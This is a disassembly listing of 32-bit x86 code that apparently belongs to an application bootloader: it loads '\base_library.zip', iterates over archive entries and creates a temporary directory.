  403f55:	89 74 24 04          	mov    %esi,0x4(%esp)
  403f59:	89 44 24 08          	mov    %eax,0x8(%esp)
  403f5d:	c7 04 24 00 92 41 00 	movl   $0x419200,(%esp)
  403f64:	e8 8f 69 00 00       	call   0x40a8f8
  403f69:	ba 00 92 41 00       	mov    $0x419200,%edx
  403f6e:	8b 0a                	mov    (%edx),%ecx
  403f70:	83 c2 04             	add    $0x4,%edx
  403f73:	8d 81 ff fe fe fe    	lea    -0x1010101(%ecx),%eax
  403f79:	f7 d1                	not    %ecx
  403f7b:	21 c8                	and    %ecx,%eax
  403f7d:	25 80 80 80 80       	and    $0x80808080,%eax
  403f82:	74 ea                	je     0x403f6e
  403f84:	89 c1                	mov    %eax,%ecx
  403f86:	89 34 24             	mov    %esi,(%esp)
  403f89:	c1 e9 10             	shr    $0x10,%ecx
  403f8c:	a9 80 80 00 00       	test   $0x8080,%eax
  403f91:	0f 44 c1             	cmove  %ecx,%eax
  403f94:	8d 4a 02             	lea    0x2(%edx),%ecx
  403f97:	0f 44 d1             	cmove  %ecx,%edx
  403f9a:	00 c0                	add    %al,%al
  403f9c:	b8 3b 00 00 00       	mov    $0x3b,%eax
  403fa1:	83 da 03             	sbb    $0x3,%edx
  403fa4:	81 ea 00 92 41 00    	sub    $0x419200,%edx
  403faa:	c6 82 00 92 41 00 5c 	movb   $0x5c,0x419200(%edx)
  403fb1:	c7 82 01 92 41 00 62 	movl   $0x65736162,0x419201(%edx)
  403fb8:	61 73 65 
  403fbb:	c7 82 05 92 41 00 5f 	movl   $0x62696c5f,0x419205(%edx)
  403fc2:	6c 69 62 
  403fc5:	c7 82 09 92 41 00 72 	movl   $0x79726172,0x419209(%edx)
  403fcc:	61 72 79 
  403fcf:	c7 82 0d 92 41 00 2e 	movl   $0x70697a2e,0x41920d(%edx)
  403fd6:	7a 69 70 
  403fd9:	66 89 82 11 92 41 00 	mov    %ax,0x419211(%edx)
  403fe0:	e8 e3 68 00 00       	call   0x40a8c8
  403fe5:	89 74 24 04          	mov    %esi,0x4(%esp)
  403fe9:	89 44 24 08          	mov    %eax,0x8(%esp)
  403fed:	c7 04 24 00 92 41 00 	movl   $0x419200,(%esp)
  403ff4:	e8 0f 69 00 00       	call   0x40a908
  403ff9:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  404000:	00 
  404001:	c7 44 24 04 00 92 41 	movl   $0x419200,0x4(%esp)
  404008:	00 
  404009:	c7 04 24 c0 71 41 00 	movl   $0x4171c0,(%esp)
  404010:	e8 fb 11 00 00       	call   0x405210
  404015:	85 c0                	test   %eax,%eax
  404017:	0f 84 34 01 00 00    	je     0x404151
  40401d:	c7 04 24 c0 71 41 00 	movl   $0x4171c0,(%esp)
  404024:	ff 15 a0 20 41 00    	call   *0x4120a0
  40402a:	a1 74 e6 41 00       	mov    0x41e674,%eax
  40402f:	85 c0                	test   %eax,%eax
  404031:	0f 85 3c fe ff ff    	jne    0x403e73
  404037:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  40403e:	00 
  40403f:	89 74 24 04          	mov    %esi,0x4(%esp)
  404043:	c7 04 24 40 41 41 00 	movl   $0x414140,(%esp)
  40404a:	e8 c1 11 00 00       	call   0x405210
  40404f:	85 c0                	test   %eax,%eax
  404051:	0f 84 c0 00 00 00    	je     0x404117
  404057:	c7 04 24 40 41 41 00 	movl   $0x414140,(%esp)
  40405e:	ff 15 98 20 41 00    	call   *0x412098
  404064:	e9 36 fe ff ff       	jmp    0x403e9f
  404069:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404070:	e8 6b 13 00 00       	call   0x4053e0
  404075:	85 c0                	test   %eax,%eax
  404077:	89 c6                	mov    %eax,%esi
  404079:	0f 84 ae 00 00 00    	je     0x40412d
  40407f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404086:	00 
  404087:	89 44 24 04          	mov    %eax,0x4(%esp)
  40408b:	8b 83 70 40 00 00    	mov    0x4070(%ebx),%eax
  404091:	89 04 24             	mov    %eax,(%esp)
  404094:	ff 15 48 20 41 00    	call   *0x412048
  40409a:	89 34 24             	mov    %esi,(%esp)
  40409d:	e8 fe fc ff ff       	call   0x403da0
  4040a2:	e9 95 fe ff ff       	jmp    0x403f3c
  4040a7:	89 f6                	mov    %esi,%esi
  4040a9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4040b0:	c7 04 24 c0 71 41 00 	movl   $0x4171c0,(%esp)
  4040b7:	ff 15 3c 20 41 00    	call   *0x41203c
  4040bd:	e9 28 fe ff ff       	jmp    0x403eea
  4040c2:	c7 04 24 c4 d1 40 00 	movl   $0x40d1c4,(%esp)
  4040c9:	e8 42 dd ff ff       	call   0x401e10
  4040ce:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4040d3:	e9 72 fe ff ff       	jmp    0x403f4a
  4040d8:	c7 04 24 88 d0 40 00 	movl   $0x40d088,(%esp)
  4040df:	e8 2c dd ff ff       	call   0x401e10
  4040e4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4040e9:	e9 5c fe ff ff       	jmp    0x403f4a
  4040ee:	66 90                	xchg   %ax,%ax
  4040f0:	c7 04 24 40 d1 40 00 	movl   $0x40d140,(%esp)
  4040f7:	e8 14 dd ff ff       	call   0x401e10
  4040fc:	e9 dd fd ff ff       	jmp    0x403ede
  404101:	c7 04 24 80 d1 40 00 	movl   $0x40d180,(%esp)
  404108:	e8 03 dd ff ff       	call   0x401e10
  40410d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404112:	e9 33 fe ff ff       	jmp    0x403f4a
  404117:	c7 04 24 18 d1 40 00 	movl   $0x40d118,(%esp)
  40411e:	e8 ed dc ff ff       	call   0x401e10
  404123:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404128:	e9 1d fe ff ff       	jmp    0x403f4a
  40412d:	c7 04 24 a0 d1 40 00 	movl   $0x40d1a0,(%esp)
  404134:	e8 d7 dc ff ff       	call   0x401e10
  404139:	eb d2                	jmp    0x40410d
  40413b:	c7 04 24 d8 d0 40 00 	movl   $0x40d0d8,(%esp)
  404142:	e8 c9 dc ff ff       	call   0x401e10
  404147:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40414c:	e9 f9 fd ff ff       	jmp    0x403f4a
  404151:	c7 04 24 b0 d0 40 00 	movl   $0x40d0b0,(%esp)
  404158:	e8 b3 dc ff ff       	call   0x401e10
  40415d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404162:	e9 e3 fd ff ff       	jmp    0x403f4a
  404167:	89 f6                	mov    %esi,%esi
  404169:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404170:	55                   	push   %ebp
  404171:	57                   	push   %edi
  404172:	56                   	push   %esi
  404173:	53                   	push   %ebx
  404174:	83 ec 2c             	sub    $0x2c,%esp
  404177:	8b 0d 74 e6 41 00    	mov    0x41e674,%ecx
  40417d:	8b 5c 24 40          	mov    0x40(%esp),%ebx
  404181:	85 c9                	test   %ecx,%ecx
  404183:	74 3d                	je     0x4041c2
  404185:	8d 83 68 30 00 00    	lea    0x3068(%ebx),%eax
  40418b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404192:	00 
  404193:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40419a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40419e:	e8 6d 14 00 00       	call   0x405610
  4041a3:	85 c0                	test   %eax,%eax
  4041a5:	89 c7                	mov    %eax,%edi
  4041a7:	0f 84 9e 01 00 00    	je     0x40434b
  4041ad:	89 04 24             	mov    %eax,(%esp)
  4041b0:	ff 15 50 20 41 00    	call   *0x412050
  4041b6:	89 3c 24             	mov    %edi,(%esp)
  4041b9:	89 c6                	mov    %eax,%esi
  4041bb:	e8 d8 66 00 00       	call   0x40a898
  4041c0:	eb 2d                	jmp    0x4041ef
  4041c2:	8d b3 68 30 00 00    	lea    0x3068(%ebx),%esi
  4041c8:	89 34 24             	mov    %esi,(%esp)
  4041cb:	e8 f8 66 00 00       	call   0x40a8c8
  4041d0:	89 34 24             	mov    %esi,(%esp)
  4041d3:	c7 44 24 0c 0c d2 40 	movl   $0x40d20c,0xc(%esp)
  4041da:	00 
  4041db:	c7 44 24 08 13 d2 40 	movl   $0x40d213,0x8(%esp)
  4041e2:	00 
  4041e3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4041e7:	ff 15 20 20 41 00    	call   *0x412020
  4041ed:	89 c6                	mov    %eax,%esi
  4041ef:	85 f6                	test   %esi,%esi
  4041f1:	0f 84 67 01 00 00    	je     0x40435e
  4041f7:	89 74 24 04          	mov    %esi,0x4(%esp)
  4041fb:	c7 04 24 41 d2 40 00 	movl   $0x40d241,(%esp)
  404202:	ff 15 40 20 41 00    	call   *0x412040
  404208:	c7 04 24 4a d2 40 00 	movl   $0x40d24a,(%esp)
  40420f:	ff 15 70 20 41 00    	call   *0x412070
  404215:	89 04 24             	mov    %eax,(%esp)
  404218:	ff 15 60 20 41 00    	call   *0x412060
  40421e:	c7 44 24 04 52 d2 40 	movl   $0x40d252,0x4(%esp)
  404225:	00 
  404226:	89 04 24             	mov    %eax,(%esp)
  404229:	ff 15 94 20 41 00    	call   *0x412094
  40422f:	8b 6b 08             	mov    0x8(%ebx),%ebp
  404232:	3b 6b 0c             	cmp    0xc(%ebx),%ebp
  404235:	89 44 24 18          	mov    %eax,0x18(%esp)
  404239:	a1 d4 f3 41 00       	mov    0x41f3d4,%eax
  40423e:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404242:	72 23                	jb     0x404267
  404244:	e9 f8 00 00 00       	jmp    0x404341
  404249:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404250:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404254:	89 1c 24             	mov    %ebx,(%esp)
  404257:	e8 74 d3 ff ff       	call   0x4015d0
  40425c:	39 43 0c             	cmp    %eax,0xc(%ebx)
  40425f:	89 c5                	mov    %eax,%ebp
  404261:	0f 86 da 00 00 00    	jbe    0x404341
  404267:	0f b6 45 11          	movzbl 0x11(%ebp),%eax
  40426b:	83 e0 df             	and    $0xffffffdf,%eax
  40426e:	3c 4d                	cmp    $0x4d,%al
  404270:	75 de                	jne    0x404250
  404272:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  404276:	89 1c 24             	mov    %ebx,(%esp)
  404279:	e8 92 d3 ff ff       	call   0x401610
  40427e:	8b 15 74 e6 41 00    	mov    0x41e674,%edx
  404284:	89 c6                	mov    %eax,%esi
  404286:	8b 45 0c             	mov    0xc(%ebp),%eax
  404289:	8b 3d 5c 20 41 00    	mov    0x41205c,%edi
  40428f:	85 d2                	test   %edx,%edx
  404291:	89 04 24             	mov    %eax,(%esp)
  404294:	74 6a                	je     0x404300
  404296:	ff 54 24 1c          	call   *0x1c(%esp)
  40429a:	83 ec 04             	sub    $0x4,%esp
  40429d:	83 e8 08             	sub    $0x8,%eax
  4042a0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4042a4:	8d 46 08             	lea    0x8(%esi),%eax
  4042a7:	c7 44 24 04 58 d2 40 	movl   $0x40d258,0x4(%esp)
  4042ae:	00 
  4042af:	89 44 24 08          	mov    %eax,0x8(%esp)
  4042b3:	8b 44 24 18          	mov    0x18(%esp),%eax
  4042b7:	89 04 24             	mov    %eax,(%esp)
  4042ba:	ff d7                	call   *%edi
  4042bc:	85 c0                	test   %eax,%eax
  4042be:	8d 7d 12             	lea    0x12(%ebp),%edi
  4042c1:	74 6c                	je     0x40432f
  4042c3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4042c7:	89 3c 24             	mov    %edi,(%esp)
  4042ca:	ff 15 74 20 41 00    	call   *0x412074
  4042d0:	85 c0                	test   %eax,%eax
  4042d2:	74 5b                	je     0x40432f
  4042d4:	ff 15 8c 20 41 00    	call   *0x41208c
  4042da:	85 c0                	test   %eax,%eax
  4042dc:	74 0c                	je     0x4042ea
  4042de:	ff 15 88 20 41 00    	call   *0x412088
  4042e4:	ff 15 90 20 41 00    	call   *0x412090
  4042ea:	89 34 24             	mov    %esi,(%esp)
  4042ed:	e8 a6 65 00 00       	call   0x40a898
  4042f2:	e9 59 ff ff ff       	jmp    0x404250
  4042f7:	89 f6                	mov    %esi,%esi
  4042f9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404300:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  404306:	83 ec 04             	sub    $0x4,%esp
  404309:	83 e8 0c             	sub    $0xc,%eax
  40430c:	89 44 24 0c          	mov    %eax,0xc(%esp)
  404310:	8d 46 0c             	lea    0xc(%esi),%eax
  404313:	c7 44 24 04 5b d2 40 	movl   $0x40d25b,0x4(%esp)
  40431a:	00 
  40431b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40431f:	8b 44 24 18          	mov    0x18(%esp),%eax
  404323:	89 04 24             	mov    %eax,(%esp)
  404326:	ff d7                	call   *%edi
  404328:	85 c0                	test   %eax,%eax
  40432a:	8d 7d 12             	lea    0x12(%ebp),%edi
  40432d:	75 94                	jne    0x4042c3
  40432f:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404333:	c7 04 24 5e d2 40 00 	movl   $0x40d25e,(%esp)
  40433a:	e8 d1 da ff ff       	call   0x401e10
  40433f:	eb 93                	jmp    0x4042d4
  404341:	31 c0                	xor    %eax,%eax
  404343:	83 c4 2c             	add    $0x2c,%esp
  404346:	5b                   	pop    %ebx
  404347:	5e                   	pop    %esi
  404348:	5f                   	pop    %edi
  404349:	5d                   	pop    %ebp
  40434a:	c3                   	ret
  40434b:	c7 04 24 e8 d1 40 00 	movl   $0x40d1e8,(%esp)
  404352:	e8 b9 da ff ff       	call   0x401e10
  404357:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40435c:	eb e5                	jmp    0x404343
  40435e:	c7 04 24 1c d2 40 00 	movl   $0x40d21c,(%esp)
  404365:	e8 a6 da ff ff       	call   0x401e10
  40436a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40436f:	eb d2                	jmp    0x404343
  404371:	eb 0d                	jmp    0x404380
  404373:	90                   	nop
  404374:	90                   	nop
  404375:	90                   	nop
  404376:	90                   	nop
  404377:	90                   	nop
  404378:	90                   	nop
  404379:	90                   	nop
  40437a:	90                   	nop
  40437b:	90                   	nop
  40437c:	90                   	nop
  40437d:	90                   	nop
  40437e:	90                   	nop
  40437f:	90                   	nop
  404380:	57                   	push   %edi
  404381:	56                   	push   %esi
  404382:	53                   	push   %ebx
  404383:	83 ec 10             	sub    $0x10,%esp
  404386:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  40438a:	8b 44 24 24          	mov    0x24(%esp),%eax
  40438e:	8b 7b 04             	mov    0x4(%ebx),%edi
  404391:	8b 40 04             	mov    0x4(%eax),%eax
  404394:	83 c3 68             	add    $0x68,%ebx
  404397:	89 04 24             	mov    %eax,(%esp)
  40439a:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  4043a0:	01 c7                	add    %eax,%edi
  4043a2:	a1 74 e6 41 00       	mov    0x41e674,%eax
  4043a7:	83 ec 04             	sub    $0x4,%esp
  4043aa:	85 c0                	test   %eax,%eax
  4043ac:	74 47                	je     0x4043f5
  4043ae:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4043b5:	00 
  4043b6:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4043ba:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4043c1:	e8 4a 12 00 00       	call   0x405610
  4043c6:	85 c0                	test   %eax,%eax
  4043c8:	89 c6                	mov    %eax,%esi
  4043ca:	0f 84 b5 00 00 00    	je     0x404485
  4043d0:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4043d4:	89 44 24 04          	mov    %eax,0x4(%esp)
  4043d8:	c7 04 24 97 d2 40 00 	movl   $0x40d297,(%esp)
  4043df:	ff 15 2c 20 41 00    	call   *0x41202c
  4043e5:	39 f3                	cmp    %esi,%ebx
  4043e7:	89 c7                	mov    %eax,%edi
  4043e9:	74 51                	je     0x40443c
  4043eb:	89 34 24             	mov    %esi,(%esp)
  4043ee:	e8 a5 64 00 00       	call   0x40a898
  4043f3:	eb 47                	jmp    0x40443c
  4043f5:	89 1c 24             	mov    %ebx,(%esp)
  4043f8:	e8 cb 64 00 00       	call   0x40a8c8
  4043fd:	89 1c 24             	mov    %ebx,(%esp)
  404400:	c7 44 24 0c 0c d2 40 	movl   $0x40d20c,0xc(%esp)
  404407:	00 
  404408:	c7 44 24 08 13 d2 40 	movl   $0x40d213,0x8(%esp)
  40440f:	00 
  404410:	89 44 24 04          	mov    %eax,0x4(%esp)
  404414:	ff 15 20 20 41 00    	call   *0x412020
  40441a:	89 c3                	mov    %eax,%ebx
  40441c:	89 7c 24 08          	mov    %edi,0x8(%esp)
  404420:	89 44 24 04          	mov    %eax,0x4(%esp)
  404424:	c7 04 24 9d d2 40 00 	movl   $0x40d29d,(%esp)
  40442b:	ff 15 28 20 41 00    	call   *0x412028
  404431:	89 1c 24             	mov    %ebx,(%esp)
  404434:	89 c7                	mov    %eax,%edi
  404436:	ff 15 b8 20 41 00    	call   *0x4120b8
  40443c:	c7 04 24 a3 d2 40 00 	movl   $0x40d2a3,(%esp)
  404443:	ff 15 44 20 41 00    	call   *0x412044
  404449:	85 c0                	test   %eax,%eax
  40444b:	74 4f                	je     0x40449c
  40444d:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404451:	89 04 24             	mov    %eax,(%esp)
  404454:	ff 15 6c 20 41 00    	call   *0x41206c
  40445a:	89 c3                	mov    %eax,%ebx
  40445c:	31 c0                	xor    %eax,%eax
  40445e:	85 db                	test   %ebx,%ebx
  404460:	75 0e                	jne    0x404470
  404462:	83 c4 10             	add    $0x10,%esp
  404465:	5b                   	pop    %ebx
  404466:	5e                   	pop    %esi
  404467:	5f                   	pop    %edi
  404468:	c3                   	ret
  404469:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404470:	c7 04 24 d0 d2 40 00 	movl   $0x40d2d0,(%esp)
  404477:	e8 94 d9 ff ff       	call   0x401e10
  40447c:	83 c4 10             	add    $0x10,%esp
  40447f:	89 d8                	mov    %ebx,%eax
  404481:	5b                   	pop    %ebx
  404482:	5e                   	pop    %esi
  404483:	5f                   	pop    %edi
  404484:	c3                   	ret
  404485:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404489:	c7 04 24 70 d2 40 00 	movl   $0x40d270,(%esp)
  404490:	e8 7b d9 ff ff       	call   0x401e10
  404495:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40449a:	eb c6                	jmp    0x404462
  40449c:	c7 04 24 a8 d2 40 00 	movl   $0x40d2a8,(%esp)
  4044a3:	e8 68 d9 ff ff       	call   0x401e10
  4044a8:	89 3c 24             	mov    %edi,(%esp)
  4044ab:	ff 15 b8 20 41 00    	call   *0x4120b8
  4044b1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4044b6:	eb aa                	jmp    0x404462
  4044b8:	90                   	nop
  4044b9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4044c0:	56                   	push   %esi
  4044c1:	53                   	push   %ebx
  4044c2:	83 ec 14             	sub    $0x14,%esp
  4044c5:	8b 74 24 20          	mov    0x20(%esp),%esi
  4044c9:	8b 5e 08             	mov    0x8(%esi),%ebx
  4044cc:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  4044cf:	72 15                	jb     0x4044e6
  4044d1:	eb 2d                	jmp    0x404500
  4044d3:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4044d7:	89 34 24             	mov    %esi,(%esp)
  4044da:	e8 f1 d0 ff ff       	call   0x4015d0
  4044df:	39 46 0c             	cmp    %eax,0xc(%esi)
  4044e2:	89 c3                	mov    %eax,%ebx
  4044e4:	76 1a                	jbe    0x404500
  4044e6:	80 7b 11 7a          	cmpb   $0x7a,0x11(%ebx)
  4044ea:	75 e7                	jne    0x4044d3
  4044ec:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4044f0:	89 34 24             	mov    %esi,(%esp)
  4044f3:	e8 88 fe ff ff       	call   0x404380
  4044f8:	eb d9                	jmp    0x4044d3
  4044fa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404500:	83 c4 14             	add    $0x14,%esp
  404503:	31 c0                	xor    %eax,%eax
  404505:	5b                   	pop    %ebx
  404506:	5e                   	pop    %esi
  404507:	c3                   	ret
  404508:	90                   	nop
  404509:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  404510:	8b 44 24 04          	mov    0x4(%esp),%eax
  404514:	83 b8 6c 40 00 00 01 	cmpl   $0x1,0x406c(%eax)
  40451b:	74 03                	je     0x404520
  40451d:	f3 c3                	repz ret
  40451f:	90                   	nop
  404520:	a1 b0 20 41 00       	mov    0x4120b0,%eax
  404525:	ff e0                	jmp    *%eax
  404527:	90                   	nop
  404528:	90                   	nop
  404529:	90                   	nop
  40452a:	90                   	nop
  40452b:	90                   	nop
  40452c:	90                   	nop
  40452d:	90                   	nop
  40452e:	90                   	nop
  40452f:	90                   	nop
  404530:	53                   	push   %ebx
  404531:	89 c3                	mov    %eax,%ebx
  404533:	83 ec 18             	sub    $0x18,%esp
  404536:	c7 04 24 64 00 00 00 	movl   $0x64,(%esp)
  40453d:	ff 15 94 f2 41 00    	call   *0x41f294
  404543:	83 ec 04             	sub    $0x4,%esp
  404546:	89 1c 24             	mov    %ebx,(%esp)
  404549:	e8 12 64 00 00       	call   0x40a960
  40454e:	83 c4 18             	add    $0x18,%esp
  404551:	5b                   	pop    %ebx
  404552:	c3                   	ret
  404553:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  404559:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  404560:	53                   	push   %ebx
  404561:	b8 18 40 00 00       	mov    $0x4018,%eax
  404566:	e8 75 60 00 00       	call   0x40a5e0
  40456b:	29 c4                	sub    %eax,%esp
  40456d:	8b 84 24 20 40 00 00 	mov    0x4020(%esp),%eax
  404574:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  404578:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40457f:	00 
  404580:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404587:	89 44 24 04          	mov    %eax,0x4(%esp)
  40458b:	e8 80 0c 00 00       	call   0x405210
  404590:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  404597:	00 
  404598:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40459c:	89 04 24             	mov    %eax,(%esp)
  40459f:	ff 15 44 f2 41 00    	call   *0x41f244
  4045a5:	83 ec 0c             	sub    $0xc,%esp
  4045a8:	85 c0                	test   %eax,%eax
  4045aa:	75 14                	jne    0x4045c0
  4045ac:	81 c4 18 40 00 00    	add    $0x4018,%esp
  4045b2:	31 c0                	xor    %eax,%eax
  4045b4:	5b                   	pop    %ebx
  4045b5:	c3                   	ret
  4045b6:	8d 76 00             	lea    0x0(%esi),%esi
  4045b9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4045c0:	8d 84 24 10 20 00 00 	lea    0x2010(%esp),%eax
  4045c7:	c7 44 24 08 00 20 00 	movl   $0x2000,0x8(%esp)
  4045ce:	00 
  4045cf:	89 1c 24             	mov    %ebx,(%esp)
  4045d2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4045d6:	ff 15 2c f2 41 00    	call   *0x41f22c
  4045dc:	83 ec 0c             	sub    $0xc,%esp
  4045df:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4045e6:	00 
  4045e7:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4045eb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4045f2:	e8 79 0a 00 00       	call   0x405070
  4045f7:	85 c0                	test   %eax,%eax
  4045f9:	74 b1                	je     0x4045ac
  4045fb:	80 38 00             	cmpb   $0x0,(%eax)
  4045fe:	74 ac                	je     0x4045ac
  404600:	89 04 24             	mov    %eax,(%esp)
  404603:	e8 50 63 00 00       	call   0x40a958
  404608:	81 c4 18 40 00 00    	add    $0x4018,%esp
  40460e:	5b                   	pop    %ebx
  40460f:	c3                   	ret
  404610:	57                   	push   %edi
  404611:	56                   	push   %esi
  404612:	53                   	push   %ebx
  404613:	83 ec 10             	sub    $0x10,%esp
  404616:	8b 44 24 20          	mov    0x20(%esp),%eax
  40461a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404621:	00 
  404622:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404629:	89 44 24 04          	mov    %eax,0x4(%esp)
  40462d:	e8 de 0b 00 00       	call   0x405210
  404632:	89 c6                	mov    %eax,%esi
  404634:	8b 44 24 24          	mov    0x24(%esp),%eax
  404638:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40463f:	00 
  404640:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404647:	89 44 24 04          	mov    %eax,0x4(%esp)
  40464b:	e8 c0 0b 00 00       	call   0x405210
  404650:	89 34 24             	mov    %esi,(%esp)
  404653:	89 c3                	mov    %eax,%ebx
  404655:	89 44 24 04          	mov    %eax,0x4(%esp)
  404659:	ff 15 8c f2 41 00    	call   *0x41f28c
  40465f:	83 ec 08             	sub    $0x8,%esp
  404662:	89 c7                	mov    %eax,%edi
  404664:	89 34 24             	mov    %esi,(%esp)
  404667:	e8 2c 62 00 00       	call   0x40a898
  40466c:	89 1c 24             	mov    %ebx,(%esp)
  40466f:	e8 24 62 00 00       	call   0x40a898
  404674:	83 c4 10             	add    $0x10,%esp
  404677:	89 f8                	mov    %edi,%eax
  404679:	5b                   	pop    %ebx
  40467a:	5e                   	pop    %esi
  40467b:	5f                   	pop    %edi
  40467c:	c3                   	ret
  40467d:	8d 76 00             	lea    0x0(%esi),%esi
  404680:	56                   	push   %esi
  404681:	53                   	push   %ebx
  404682:	83 ec 14             	sub    $0x14,%esp
  404685:	8b 44 24 20          	mov    0x20(%esp),%eax
  404689:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  404690:	00 
  404691:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  404698:	89 44 24 04          	mov    %eax,0x4(%esp)
  40469c:	e8 6f 0b 00 00       	call   0x405210
  4046a1:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4046a8:	00 
  4046a9:	89 c3                	mov    %eax,%ebx
  4046ab:	89 04 24             	mov    %eax,(%esp)
  4046ae:	ff 15 8c f2 41 00    	call   *0x41f28c
  4046b4:	83 ec 08             	sub    $0x8,%esp
  4046b7:	89 c6                	mov    %eax,%esi
  4046b9:	89 1c 24             	mov    %ebx,(%esp)
  4046bc:	e8 d7 61 00 00       	call   0x40a898
  4046c1:	83 c4 14             	add    $0x14,%esp
  4046c4:	89 f0                	mov    %esi,%eax
  4046c6:	5b                   	pop    %ebx
  4046c7:	5e                   	pop    %esi
  4046c8:	c3                   	ret
  4046c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4046d0:	55                   	push   %ebp
  4046d1:	57                   	push   %edi
  4046d2:	b8 2c 20 00 00       	mov    $0x202c,%eax
  4046d7:	56                   	push   %esi
  4046d8:	53                   	push   %ebx
  4046d9:	e8 02 5f 00 00       	call   0x40a5e0
  4046de:	29 c4                	sub    %eax,%esp
  4046e0:	8d 5c 24 20          	lea    0x20(%esp),%ebx
  4046e4:	8b b4 24 40 20 00 00 	mov    0x2040(%esp),%esi
  4046eb:	c7 04 24 00 10 00 00 	movl   $0x1000,(%esp)
  4046f2:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  4046f6:	ff 15 68 f2 41 00    	call   *0x41f268
  4046fc:	83 ec 08             	sub    $0x8,%esp
  4046ff:	8d 7c 24 10          	lea    0x10(%esp),%edi
  404703:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  404707:	c7 44 24 08 00 10 00 	movl   $0x1000,0x8(%esp)
  40470e:	00 
  40470f:	89 34 24             	mov    %esi,(%esp)
  404712:	bb 05 00 00 00       	mov    $0x5,%ebx
  404717:	e8 54 09 00 00       	call   0x405070
  40471c:	e8 47 62 00 00       	call   0x40a968
  404721:	c7 44 24 04 f0 d2 40 	movl   $0x40d2f0,0x4(%esp)
  404728:	00 
  404729:	89 44 24 08          	mov    %eax,0x8(%esp)
  40472d:	89 3c 24             	mov    %edi,(%esp)
  404730:	e8 13 62 00 00       	call   0x40a948
  404735:	89 7c 24 04          	mov    %edi,0x4(%esp)
  404739:	89 34 24             	mov    %esi,(%esp)
  40473c:	ff 15 24 f3 41 00    	call   *0x41f324
  404742:	89 04 24             	mov    %eax,(%esp)
  404745:	89 c5                	mov    %eax,%ebp
  404747:	e8 24 62 00 00       	call   0x40a970
  40474c:	85 c0                	test   %eax,%eax
  40474e:	74 20                	je     0x404770
  404750:	89 2c 24             	mov    %ebp,(%esp)
  404753:	e8 40 61 00 00       	call   0x40a898
  404758:	83 eb 01             	sub    $0x1,%ebx
  40475b:	75 d8                	jne    0x404735
  40475d:	81 c4 2c 20 00 00    	add    $0x202c,%esp
  404763:	31 c0                	xor    %eax,%eax
  404765:	5b                   	pop    %ebx
  404766:	5e                   	pop    %esi
  404767:	5f                   	pop    %edi
  404768:	5d                   	pop    %ebp
  404769:	c3                   	ret
  40476a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
